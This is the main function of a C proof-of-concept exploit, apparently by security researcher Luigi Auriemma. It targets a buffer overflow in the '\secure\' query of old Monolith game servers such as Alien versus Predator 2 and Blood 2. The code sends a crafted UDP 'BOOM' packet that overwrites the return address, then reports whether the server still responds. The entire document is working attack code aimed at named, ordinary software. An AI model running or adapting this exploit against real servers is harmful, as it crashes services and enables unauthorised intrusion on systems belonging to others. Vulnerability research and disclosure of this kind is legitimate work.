int main(int argc, char *argv[]) {
    int     sd;
    u_short port = PORT;
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "\\secure\\ buffer overflow in some old Monolith games "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: [email protected]\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%d)]\n"
            "\n"
            "Vulnerable games            Latest versions\n"
            "  Alien versus predator 2   1.0.9.6\n"
            "  Blood 2                   2.1\n"
            "  No one lives forever      1.004\n"
            "  Shogo                     2.2\n"
            "\n"
            "Note: the return address will be overwritten by 0x%08lx\n"
            "      (only the bytes from 0x20 to 0x7f are allowed)\n"
            "\n", argv[0], port, *(u_long *)(PCK + 72));
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target is %s:%hu\n\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- Request informations:\n", stdout);
    gs_info_udp(peer.sin_addr.s_addr, port);

    fputs("- Send BOOM packet:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    if(sendto(sd, PCK, sizeof(PCK) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    close(sd);

    fputs("- Check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    if(sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}